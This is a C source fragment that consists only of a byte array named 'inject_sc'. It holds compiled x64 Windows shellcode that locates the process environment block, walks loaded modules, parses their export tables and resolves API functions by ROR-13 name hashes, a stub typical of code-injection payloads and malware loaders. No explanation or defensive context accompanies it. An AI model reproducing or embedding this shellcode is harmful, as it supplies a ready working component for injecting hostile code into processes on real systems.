static const unsigned char inject_sc[] = {
0x48 ,0x83 ,0xec ,0x28 ,0xe8 ,0xb7 ,0xf4 ,0xff ,0xff ,0x48 ,0x83 ,0xc4 ,0x28 ,0xc3 ,0xcc ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0x48 ,0x89 ,0x4c ,0x24 ,0x08 ,0x48 ,0x83 ,0xec ,0x18 ,0xc7 ,0x04 ,0x24 ,0x00 ,
0x00 ,0x00 ,0x00 ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x0f ,0xbe ,0x00 ,0x85 ,0xc0 ,0x74 ,0x58 ,
0x8b ,0x04 ,0x24 ,0xc1 ,0xe8 ,0x0d ,0x8b ,0x0c ,0x24 ,0xc1 ,0xe1 ,0x13 ,0x0b ,0xc1 ,0x89 ,
0x04 ,0x24 ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x0f ,0xbe ,0x00 ,0x83 ,0xf8 ,0x61 ,0x7c ,0x11 ,
0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x0f ,0xbe ,0x00 ,0x83 ,0xe8 ,0x20 ,0x89 ,0x44 ,0x24 ,0x04 ,
0xeb ,0x0c ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x0f ,0xbe ,0x00 ,0x89 ,0x44 ,0x24 ,0x04 ,0x8b ,
0x44 ,0x24 ,0x04 ,0x8b ,0x0c ,0x24 ,0x03 ,0xc8 ,0x8b ,0xc1 ,0x89 ,0x04 ,0x24 ,0x48 ,0x8b ,
0x44 ,0x24 ,0x20 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0x44 ,0x24 ,0x20 ,0xeb ,0x9c ,0x8b ,0x04 ,
0x24 ,0x48 ,0x83 ,0xc4 ,0x18 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0x66 ,0x89 ,0x4c ,0x24 ,
0x08 ,0x0f ,0xb7 ,0x44 ,0x24 ,0x08 ,0x83 ,0xf8 ,0x41 ,0x7c ,0x16 ,0x0f ,0xb7 ,0x44 ,0x24 ,
0x08 ,0x83 ,0xf8 ,0x5a ,0x7f ,0x0c ,0x0f ,0xb7 ,0x44 ,0x24 ,0x08 ,0x83 ,0xc0 ,0x20 ,0xeb ,
0x07 ,0xeb ,0x05 ,0x0f ,0xb7 ,0x44 ,0x24 ,0x08 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0x44 ,0x88 ,0x44 ,0x24 ,0x18 ,0x48 ,0x89 ,0x54 ,0x24 ,0x10 ,0x48 ,0x89 ,0x4c ,0x24 ,0x08 ,
0x48 ,0x83 ,0xec ,0x48 ,0x48 ,0x8b ,0x44 ,0x24 ,0x50 ,0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x0f ,
0x84 ,0x11 ,0x01 ,0x00 ,0x00 ,0x48 ,0x8b ,0x44 ,0x24 ,0x50 ,0x48 ,0x89 ,0x44 ,0x24 ,0x38 ,
0x48 ,0x8b ,0x44 ,0x24 ,0x58 ,0x48 ,0x89 ,0x44 ,0x24 ,0x30 ,0x0f ,0xb6 ,0x44 ,0x24 ,0x60 ,
0x85 ,0xc0 ,0x74 ,0x60 ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x74 ,
0x42 ,0x48 ,0x8b ,0x44 ,0x24 ,0x30 ,0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x74 ,0x36 ,0x48 ,0x8b ,
0x44 ,0x24 ,0x38 ,0x0f ,0xb7 ,0x08 ,0xe8 ,0x5b ,0xff ,0xff ,0xff ,0x0f ,0xb7 ,0xc0 ,0x89 ,
0x44 ,0x24 ,0x2c ,0x48 ,0x8b ,0x4c ,0x24 ,0x30 ,0x0f ,0xb7 ,0x09 ,0xe8 ,0x47 ,0xff ,0xff ,
0xff ,0x0f ,0xb7 ,0xc0 ,0x8b ,0x4c ,0x24 ,0x2c ,0x3b ,0xc8 ,0x75 ,0x0a ,0xc7 ,0x44 ,0x24 ,
0x20 ,0x01 ,0x00 ,0x00 ,0x00 ,0xeb ,0x08 ,0xc7 ,0x44 ,0x24 ,0x20 ,0x00 ,0x00 ,0x00 ,0x00 ,
0x8b ,0x44 ,0x24 ,0x20 ,0x89 ,0x44 ,0x24 ,0x28 ,0xeb ,0x46 ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,
0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x74 ,0x2a ,0x48 ,0x8b ,0x44 ,0x24 ,0x30 ,0x0f ,0xb7 ,0x00 ,
0x85 ,0xc0 ,0x74 ,0x1e ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x0f ,0xb7 ,0x00 ,0x48 ,0x8b ,0x4c ,
0x24 ,0x30 ,0x0f ,0xb7 ,0x09 ,0x3b ,0xc1 ,0x75 ,0x0a ,0xc7 ,0x44 ,0x24 ,0x24 ,0x01 ,0x00 ,
0x00 ,0x00 ,0xeb ,0x08 ,0xc7 ,0x44 ,0x24 ,0x24 ,0x00 ,0x00 ,0x00 ,0x00 ,0x8b ,0x44 ,0x24 ,
0x24 ,0x89 ,0x44 ,0x24 ,0x28 ,0x83 ,0x7c ,0x24 ,0x28 ,0x00 ,0x74 ,0x21 ,0x48 ,0x8b ,0x44 ,
0x24 ,0x38 ,0x48 ,0x83 ,0xc0 ,0x02 ,0x48 ,0x89 ,0x44 ,0x24 ,0x38 ,0x48 ,0x8b ,0x44 ,0x24 ,
0x30 ,0x48 ,0x83 ,0xc0 ,0x02 ,0x48 ,0x89 ,0x44 ,0x24 ,0x30 ,0xe9 ,0x29 ,0xff ,0xff ,0xff ,
0x48 ,0x8b ,0x44 ,0x24 ,0x30 ,0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x75 ,0x07 ,0x48 ,0x8b ,0x44 ,
0x24 ,0x50 ,0xeb ,0x15 ,0x48 ,0x8b ,0x44 ,0x24 ,0x50 ,0x48 ,0x83 ,0xc0 ,0x02 ,0x48 ,0x89 ,
0x44 ,0x24 ,0x50 ,0xe9 ,0xdf ,0xfe ,0xff ,0xff ,0x33 ,0xc0 ,0x48 ,0x83 ,0xc4 ,0x48 ,0xc3 ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0x44 ,0x89 ,0x44 ,0x24 ,0x18 ,0x48 ,0x89 ,0x54 ,0x24 ,
0x10 ,0x48 ,0x89 ,0x4c ,0x24 ,0x08 ,0x48 ,0x83 ,0xec ,0x18 ,0xc7 ,0x04 ,0x24 ,0x00 ,0x00 ,
0x00 ,0x00 ,0x48 ,0x8b ,0x44 ,0x24 ,0x28 ,0x0f ,0xb7 ,0x00 ,0x85 ,0xc0 ,0x74 ,0x3f ,0x8b ,
0x44 ,0x24 ,0x30 ,0x39 ,0x04 ,0x24 ,0x7d ,0x36 ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x48 ,0x8b ,
0x4c ,0x24 ,0x28 ,0x0f ,0xb7 ,0x09 ,0x66 ,0x89 ,0x08 ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x48 ,
0x83 ,0xc0 ,0x02 ,0x48 ,0x89 ,0x44 ,0x24 ,0x20 ,0x48 ,0x8b ,0x44 ,0x24 ,0x28 ,0x48 ,0x83 ,
0xc0 ,0x02 ,0x48 ,0x89 ,0x44 ,0x24 ,0x28 ,0x8b ,0x04 ,0x24 ,0xff ,0xc0 ,0x89 ,0x04 ,0x24 ,
0xeb ,0xb5 ,0x33 ,0xc0 ,0x48 ,0x8b ,0x4c ,0x24 ,0x20 ,0x66 ,0x89 ,0x01 ,0x48 ,0x8b ,0x44 ,
0x24 ,0x20 ,0x48 ,0x83 ,0xc4 ,0x18 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0x65 ,
0x48 ,0x8b ,0x04 ,0x25 ,0x60 ,0x00 ,0x00 ,0x00 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0x48 ,0x89 ,0x4c ,0x24 ,0x08 ,0x48 ,0x83 ,0xec ,0x18 ,0xc7 ,0x04 ,0x24 ,0x10 ,0x00 ,0x00 ,
0x00 ,0x48 ,0x63 ,0x04 ,0x24 ,0x48 ,0x8b ,0x4c ,0x24 ,0x20 ,0x48 ,0x2b ,0xc8 ,0x48 ,0x8b ,
0xc1 ,0x48 ,0x83 ,0xc4 ,0x18 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0x89 ,0x4c ,0x24 ,0x08 ,0x48 ,0x81 ,0xec ,0x98 ,0x00 ,0x00 ,0x00 ,0xe8 ,
0xb0 ,0xff ,0xff ,0xff ,0x48 ,0x89 ,0x44 ,0x24 ,0x58 ,0x48 ,0x8b ,0x44 ,0x24 ,0x58 ,0x48 ,
0x8b ,0x40 ,0x18 ,0x48 ,0x8b ,0x40 ,0x20 ,0x48 ,0x89 ,0x44 ,0x24 ,0x50 ,0x48 ,0x8b ,0x44 ,
0x24 ,0x50 ,0x48 ,0x89 ,0x44 ,0x24 ,0x40 ,0x48 ,0x8b ,0x4c ,0x24 ,0x40 ,0xe8 ,0x95 ,0xff ,
0xff ,0xff ,0x48 ,0x89 ,0x44 ,0x24 ,0x60 ,0x48 ,0x8b ,0x44 ,0x24 ,0x40 ,0x48 ,0x8b ,0x00 ,
0x48 ,0x89 ,0x44 ,0x24 ,0x40 ,0x48 ,0x8b ,0x44 ,0x24 ,0x60 ,0x48 ,0x8b ,0x40 ,0x30 ,0x48 ,
0x89 ,0x44 ,0x24 ,0x28 ,0x48 ,0x83 ,0x7c ,0x24 ,0x28 ,0x00 ,0x75 ,0x05 ,0xe9 ,0x57 ,0x01 ,
0x00 ,0x00 ,0x48 ,0x8b ,0x44 ,0x24 ,0x28 ,0x48 ,0x89 ,0x44 ,0x24 ,0x68 ,0x48 ,0x8b ,0x44 ,
0x24 ,0x68 ,0x48 ,0x63 ,0x40 ,0x3c ,0x48 ,0x8b ,0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,
0x8b ,0xc1 ,0x48 ,0x89 ,0x44 ,0x24 ,0x70 ,0xb8 ,0x08 ,0x00 ,0x00 ,0x00 ,0x48 ,0x6b ,0xc0 ,
0x00 ,0x48 ,0x8b ,0x4c ,0x24 ,0x70 ,0x8b ,0x84 ,0x01 ,0x88 ,0x00 ,0x00 ,0x00 ,0x89 ,0x44 ,
0x24 ,0x34 ,0x83 ,0x7c ,0x24 ,0x34 ,0x00 ,0x0f ,0x84 ,0x10 ,0x01 ,0x00 ,0x00 ,0x8b ,0x44 ,
0x24 ,0x34 ,0x48 ,0x8b ,0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0x48 ,0x89 ,
0x44 ,0x24 ,0x38 ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x8b ,0x40 ,0x0c ,0x48 ,0x8b ,0x4c ,0x24 ,
0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0x48 ,0x89 ,0x44 ,0x24 ,0x78 ,0x48 ,0x8b ,0x4c ,
0x24 ,0x78 ,0xe8 ,0x3b ,0xfc ,0xff ,0xff ,0x89 ,0x44 ,0x24 ,0x48 ,0x48 ,0x8b ,0x44 ,0x24 ,
0x38 ,0x8b ,0x40 ,0x20 ,0x48 ,0x8b ,0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,
0x48 ,0x89 ,0x84 ,0x24 ,0x80 ,0x00 ,0x00 ,0x00 ,0xc7 ,0x44 ,0x24 ,0x20 ,0x00 ,0x00 ,0x00 ,
0x00 ,0xeb ,0x0a ,0x8b ,0x44 ,0x24 ,0x20 ,0xff ,0xc0 ,0x89 ,0x44 ,0x24 ,0x20 ,0x48 ,0x8b ,
0x44 ,0x24 ,0x38 ,0x8b ,0x40 ,0x18 ,0x39 ,0x44 ,0x24 ,0x20 ,0x0f ,0x83 ,0x95 ,0x00 ,0x00 ,
0x00 ,0x8b ,0x44 ,0x24 ,0x20 ,0x48 ,0x8b ,0x8c ,0x24 ,0x80 ,0x00 ,0x00 ,0x00 ,0x8b ,0x04 ,
0x81 ,0x48 ,0x8b ,0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0x48 ,0x89 ,0x84 ,
0x24 ,0x88 ,0x00 ,0x00 ,0x00 ,0x48 ,0x8b ,0x8c ,0x24 ,0x88 ,0x00 ,0x00 ,0x00 ,0xe8 ,0xc7 ,
0xfb ,0xff ,0xff ,0x8b ,0x4c ,0x24 ,0x48 ,0x03 ,0xc8 ,0x8b ,0xc1 ,0x39 ,0x84 ,0x24 ,0xa0 ,
0x00 ,0x00 ,0x00 ,0x75 ,0x50 ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x8b ,0x40 ,0x24 ,0x48 ,0x8b ,
0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0x8b ,0x4c ,0x24 ,0x20 ,0x0f ,0xb7 ,
0x04 ,0x48 ,0x66 ,0x89 ,0x44 ,0x24 ,0x30 ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x8b ,0x40 ,0x1c ,
0x48 ,0x8b ,0x4c ,0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0x0f ,0xb7 ,0x4c ,0x24 ,
0x30 ,0x8b ,0x04 ,0x88 ,0x89 ,0x44 ,0x24 ,0x4c ,0x8b ,0x44 ,0x24 ,0x4c ,0x48 ,0x8b ,0x4c ,
0x24 ,0x28 ,0x48 ,0x03 ,0xc8 ,0x48 ,0x8b ,0xc1 ,0xeb ,0x17 ,0xe9 ,0x4f ,0xff ,0xff ,0xff ,
0x48 ,0x8b ,0x44 ,0x24 ,0x50 ,0x48 ,0x39 ,0x44 ,0x24 ,0x40 ,0x0f ,0x85 ,0x62 ,0xfe ,0xff ,
0xff ,0x33 ,0xc0 ,0x48 ,0x81 ,0xc4 ,0x98 ,0x00 ,0x00 ,0x00 ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0x48 ,0x89 ,0x4c ,0x24 ,0x08 ,0x57 ,0x48 ,0x81 ,0xec ,0x60 ,0x04 ,0x00 ,
0x00 ,0x48 ,0xc7 ,0x44 ,0x24 ,0x38 ,0x00 ,0x00 ,0x00 ,0x00 ,0xe8 ,0xc5 ,0xfd ,0xff ,0xff ,
0x48 ,0x89 ,0x44 ,0x24 ,0x30 ,0x48 ,0x8b ,0x44 ,0x24 ,0x30 ,0x48 ,0x8b ,0x40 ,0x18 ,0x48 ,
0x8b ,0x40 ,0x20 ,0x48 ,0x89 ,0x44 ,0x24 ,0x20 ,0xeb ,0x0d ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,
0x48 ,0x8b ,0x00 ,0x48 ,0x89 ,0x44 ,0x24 ,0x20 ,0x48 ,0x8b ,0x44 ,0x24 ,0x30 ,0x48 ,0x8b ,
0x40 ,0x18 ,0x48 ,0x83 ,0xc0 ,0x20 ,0x48 ,0x39 ,0x44 ,0x24 ,0x20 ,0x0f ,0x84 ,0xa8 ,0x00 ,
0x00 ,0x00 ,0x48 ,0x8b ,0x44 ,0x24 ,0x20 ,0x48 ,0x83 ,0xe8 ,0x10 ,0x48 ,0x89 ,0x44 ,0x24 ,
0x28 ,0x48 ,0x8d ,0x84 ,0x24 ,0x50 ,0x02 ,0x00 ,0x00 ,0x48 ,0x8b ,0xf8 ,0x33 ,0xc0 ,0xb9 ,
0x08 ,0x02 ,0x00 ,0x00 ,0xf3 ,0xaa ,0x48 ,0x8d ,0x44 ,0x24 ,0x40 ,0x48 ,0x8b ,0xf8 ,0x33 ,
0xc0 ,0xb9 ,0x08 ,0x02 ,0x00 ,0x00 ,0xf3 ,0xaa ,0x48 ,0x8b ,0x44 ,0x24 ,0x28 ,0x0f ,0xb7 ,
0x40 ,0x48 ,0x44 ,0x8b ,0xc0 ,0x48 ,0x8b ,0x44 ,0x24 ,0x28 ,0x48 ,0x8b ,0x50 ,0x50 ,0x48 ,
0x8d ,0x8c ,0x24 ,0x50 ,0x02 ,0x00 ,0x00 ,0xe8 ,0xb2 ,0xfc ,0xff ,0xff ,0x48 ,0x8b ,0x84 ,
0x24 ,0x70 ,0x04 ,0x00 ,0x00 ,0x0f ,0xb7 ,0x00 ,0x44 ,0x8b ,0xc0 ,0x48 ,0x8b ,0x84 ,0x24 ,
0x70 ,0x04 ,0x00 ,0x00 ,0x48 ,0x8b ,0x50 ,0x08 ,0x48 ,0x8d ,0x4c ,0x24 ,0x40 ,0xe8 ,0x8e ,
0xfc ,0xff ,0xff ,0x41 ,0xb0 ,0x01 ,0x48 ,0x8d ,0x54 ,0x24 ,0x40 ,0x48 ,0x8d ,0x8c ,0x24 ,
0x50 ,0x02 ,0x00 ,0x00 ,0xe8 ,0x29 ,0xfb ,0xff ,0xff ,0x48 ,0x85 ,0xc0 ,0x74 ,0x10 ,0x48 ,
0x8b ,0x44 ,0x24 ,0x28 ,0x48 ,0x8b ,0x40 ,0x30 ,0x48 ,0x89 ,0x44 ,0x24 ,0x38 ,0xeb ,0x05 ,
0xe9 ,0x33 ,0xff ,0xff ,0xff ,0x48 ,0x8b ,0x44 ,0x24 ,0x38 ,0x48 ,0x81 ,0xc4 ,0x60 ,0x04 ,
0x00 ,0x00 ,0x5f ,0xc3 ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,
0xcc ,0xcc ,0xcc ,0xcc ,0xcc ,0xcc};